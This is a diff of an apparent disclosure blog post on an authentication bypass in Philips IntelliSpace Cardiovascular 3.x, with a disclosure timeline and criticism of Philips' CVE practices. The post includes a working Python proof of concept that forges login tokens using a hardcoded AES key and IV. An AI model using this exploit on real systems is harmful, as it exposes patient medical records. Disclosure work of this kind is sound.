@@ -3,7 +3,7 @@ Date: 2024-12-09
 
 Philips' IntelliSpace Cardiovascular is a cardiovascular image management system.  It is responsible for receiving images, waveforms, and other patient data into one workspace where a physician can analyze and make a diagnosis.  I'll be breaking down a vulnerability in the 3.x branch of the software.  This vulnerability allows a replay attack to be performed on the web application.  I am not the first to uncover this vulnerability, however, I believe I am the first to demonstrate that it can be upgraded into full authentication bypass on most, if not all, extant installs of IntelliSpace Cardiovascular 3.x (which is EOL at the time of writing, though still used by some organizations).  More details on the timeline, disclosure, and remediation of this vulnerability are at the end of the article.
 
-Philips' ISCV presents as a web application, with an extra client-side component required for full functionality.  The web UI is written in ASP.NET, while parts of the backend responsible for moving/injesting/converting medical images are written in C/C++.
+Philips' ISCV presents as a web application, with an extra client-side component required for full functionality.  The web UI is written in ASP.NET, while parts of the backend responsible for moving/ingesting/converting medical images are written in C/C++.
 
 ISCV provides two methods of login the user may choose between.  The application has its own authentication store, or, the user can optionally choose to use their Windows credentials to login.  The flaw exists specifically in the Windows login flow.
 
@@ -63,45 +63,48 @@ If we could forge our own `AuthContext`s, we could bypass authentication altoget
 
 Given this information, let's develop a proof-of-concept script to forge our own `AuthContext` values.  I'll be doing this in Python, as this seems to be lingua franca for exploit PoC code.  To start, let's quickly get the plaintext constructed:
 
-    :::python
-    domain = input("Enter the domain name: ").upper()
-    username = input("Enter the username: ").upper()
-    timestamp = datetime.datetime.now()
-    timestamp_formatted = timestamp \
-        .strftime("%m/%d/%Y %l:%M:%S %p") \
-        .replace("  ", " ")
-    payload = f"{domain}\\{username};{timestamp_formatted}"
+```python
+domain = input("Enter the domain name: ").upper()
+username = input("Enter the username: ").upper()
+timestamp = datetime.datetime.now()
+timestamp_formatted = timestamp \
+    .strftime("%m/%d/%Y %l:%M:%S %p") \
+    .replace("  ", " ")
+payload = f"{domain}\\{username};{timestamp_formatted}"
+```
 
 Next, we need encode the message as UTF16-LE, pad it to a 16 byte interval using PKCS7, and apply AES-128 encryption.  The key and initialization vector for CBC mode are derived from the value within the ISCV configuration file.  Revealing the key and derivation is not necessary.  I have precomputed the AES parameters, as they do not change.
 
-    :::python
-    plaintext = payload.encode(encoding="utf-16le")
-    key = bytes([
-        0x54, 0xca, 0x19, 0xea, 0xc6, 0xf9, 0xdf, 0x9b,
-        0xc3, 0xc4, 0x9b, 0xde, 0x8f, 0xd3, 0x58, 0xcc
-    ])
-    iv = bytes([
-        0xc6, 0xf9, 0xdf, 0x9b, 0x92, 0x04, 0x69, 0x0b,
-        0xea, 0xe7, 0x60, 0x33, 0x5c, 0x3e, 0x7b, 0x6d
-    ])
-    encryptor = AES.new(key, AES.MODE_CBC, IV=iv)
-    ciphertext = encryptor.encrypt(pad(plaintext, 16, style="pkcs7"))
+```python
+plaintext = payload.encode(encoding="utf-16le")
+key = bytes([
+    0x54, 0xca, 0x19, 0xea, 0xc6, 0xf9, 0xdf, 0x9b,
+    0xc3, 0xc4, 0x9b, 0xde, 0x8f, 0xd3, 0x58, 0xcc
+])
+iv = bytes([
+    0xc6, 0xf9, 0xdf, 0x9b, 0x92, 0x04, 0x69, 0x0b,
+    0xea, 0xe7, 0x60, 0x33, 0x5c, 0x3e, 0x7b, 0x6d
+])
+encryptor = AES.new(key, AES.MODE_CBC, IV=iv)
+ciphertext = encryptor.encrypt(pad(plaintext, 16, style="pkcs7"))
+```
 
 Lastly, we need to embed this token within the GET parameters of a request to `/STS/Forms/Login.aspx`.  We'll prompt for the hostname, as it is also used to construct the value of `wtrealm`.
 
-    :::python
-    server = input("Enter the hostname/ip of the target: ")
-    authcontext = base64.b64encode(ciphertext)
-    params = urllib.parse.urlencode((
-        ("AuthContext", authcontext),
-        ("wctx", "rm=0&id=passive&ru=%2fISCV%2f"),
-        ("wa", "wsignin1.0"),
-        ("wct", timestamp.strftime("%Y-%m-%dT%R:%SZ")),
-        ("wtrealm", f"https://{server}/ISCV/")
-    ))
-    url = f"https://{server}/STS/Forms/Login.aspx?{params}"
-    print(f"Launching {url} in default browser...")
-    webbrowser.open(url, new=0, autoraise=True)
+```python
+server = input("Enter the hostname/ip of the target: ")
+authcontext = base64.b64encode(ciphertext)
+params = urllib.parse.urlencode((
+    ("AuthContext", authcontext),
+    ("wctx", "rm=0&id=passive&ru=%2fISCV%2f"),
+    ("wa", "wsignin1.0"),
+    ("wct", timestamp.strftime("%Y-%m-%dT%R:%SZ")),
+    ("wtrealm", f"https://{server}/ISCV/")
+))
+url = f"https://{server}/STS/Forms/Login.aspx?{params}"
+print(f"Launching {url} in default browser...")
+webbrowser.open(url, new=0, autoraise=True)
+```
 
 Once the link is opened, the remaining three "phases" go off and setup our session before finally logging us into the application.  Once we are in the application, ISCV helpfully provides an "emergency access" link that can be pressed to access all patient records.  The attacker is given a stern warning that this action will be logged, but, since the attacker is likely impersonating someone innocent, this doesn't prevent us from (ab)using this functionality to gain complete access to all records.
 
@@ -109,25 +112,35 @@ Once the link is opened, the remaining three "phases" go off and setup our sessi
 
 Unfortunately, my timeline of this vulnerability is incomplete, as Philips' security team routinely avoided the many of the questions I posed.  Below is the most complete timeline I was able to assemble.
 
-**May 2019** - ISCV 4.2 released, resolving static encryption key (TFS 991350)
+May 2019
+: ISCV 4.2 released, resolving static encryption key (TFS 991350)
 
-**December 2019** - ISCV 3.x goes end of production
+December 2019
+: ISCV 3.x goes end of production
 
-**April 2020** - Philips deploys ISCV 3.2.1 to my client
+April 2020
+: Philips deploys ISCV 3.2.1 to my client
 
-**September 2020** - ISCV 5.2 released, resolving replay attack vulnerability (TFS 1018920)
+September 2020
+: ISCV 5.2 released, resolving replay attack vulnerability (TFS 1018920)
 
-**December 2021** - ISCV 3.x goes end of sale.
+December 2021
+: ISCV 3.x goes end of sale.
 
-**December 2022** - ISCV 3.x goes end of mainstream support.
+December 2022
+: ISCV 3.x goes end of mainstream support.
 
-**December 21st, 2023** - Vulnerability reported.  Philips responds requesting submission via secure file drop.
+December 21st, 2023
+: Vulnerability reported.  Philips responds requesting submission via secure file drop.
 
-**January 9th, 2024** - Philips provides details of secure file drop location.  Vulnerability details and PoC reported.
+January 9th, 2024
+: Philips provides details of secure file drop location.  Vulnerability details and PoC reported.
 
-**January 22, 2024** - Response from Philips R&D relayed via product security officer for ISCV.  This message acknowledged the vulnerability, notified me that it was known, and which versions it was fixed in.  Subsequent follow up messages established the remainder of this timeline.
+January 22, 2024
+: Response from Philips R&D relayed via product security officer for ISCV.  This message acknowledged the vulnerability, notified me that it was known, and which versions it was fixed in.  Subsequent follow up messages established the remainder of this timeline.
 
-**December 2024** - ISCV 3.x goes end of support
+December 2024
+: ISCV 3.x goes end of support
 
 Philips ISCV customers are entitled to a maximum of two software upgrades annually under their standard software maintenance agreement.  At the time I discovered this vulnerability, my client was undergoing an upgrade to the current latest version of ISCV.  At the time of writing, my client transitioned off 3.x in 2024 and has no plans to take their second upgrade in 2024.  Several questions remain, but I am unlikely to get further answers.  Namely:
 
@@ -135,7 +148,7 @@ Philips ISCV customers are entitled to a maximum of two software upgrades annual
 2. What criteria does Philips use for determining whether a vulnerability will get a backported fix?  ISCV 3.x was still being sold and installed when both of these vulnerabilities were reported.  Why was the decision made to not issue a patch?
 3. What is Philips' process for disclosing vulnerabilities to customers?  Philips was unable to point to public or customer communications regarding the resolution of either of these vulnerabilities.  The existence of these vulnerabilities (and what versions they were fixed in) was limited to internal company confidential documents.
 
-In an effort to better understand how Philips approaches disclosing vulnerabilities in ISCV, I searched the CVE database as well as Philips' [public security advisories](https://www.philips.com/a-w/security/security-advisories.html).  The four Philips ISCV CVEs in the database ([CVE-2017-14111](https://www.cve.org/CVERecord?id=CVE-2017-14111), [CVE-2018-5438](https://www.cve.org/CVERecord?id=CVE-2018-5438), [CVE-2018-14787](https://www.cve.org/CVERecord?id=CVE-2018-14787), and [CVE-2018-14789](https://www.cve.org/CVERecord?id=CVE-2018-14789)) have an interesting pattern: none of them are issued by Philips.  In fact, I could find no evidence that Philips has ever actually used its authority as a CNA to issue a CVE.  This is further backed by the statement I received in an email from a senior information security officer at Philips: "CVE IDs are not created for this product's issues".  I was similarily disappointed by Philips' public security advisories.  Most of them are information about public vulnerabilities in non-Philips products.  The two ISCV specific advisories were from 2017 and 2018, which were counterparts to CVE-2017-14111 and CVE-2018-5438.
+In an effort to better understand how Philips approaches disclosing vulnerabilities in ISCV, I searched the CVE database as well as Philips' [public security advisories](https://www.philips.com/a-w/security/security-advisories.html).  The four Philips ISCV CVEs in the database ([CVE-2017-14111](https://www.cve.org/CVERecord?id=CVE-2017-14111), [CVE-2018-5438](https://www.cve.org/CVERecord?id=CVE-2018-5438), [CVE-2018-14787](https://www.cve.org/CVERecord?id=CVE-2018-14787), and [CVE-2018-14789](https://www.cve.org/CVERecord?id=CVE-2018-14789)) have an interesting pattern: none of them are issued by Philips.  In fact, I could find no evidence that Philips has ever actually used its authority as a CNA to issue a CVE.  This is further backed by the statement I received in an email from a senior information security officer at Philips: "CVE IDs are not created for this product's issues".  I was similarly disappointed by Philips' public security advisories.  Most of them are information about public vulnerabilities in non-Philips products.  The two ISCV specific advisories were from 2017 and 2018, which were counterparts to CVE-2017-14111 and CVE-2018-5438.
 
 # Closing thoughts
 
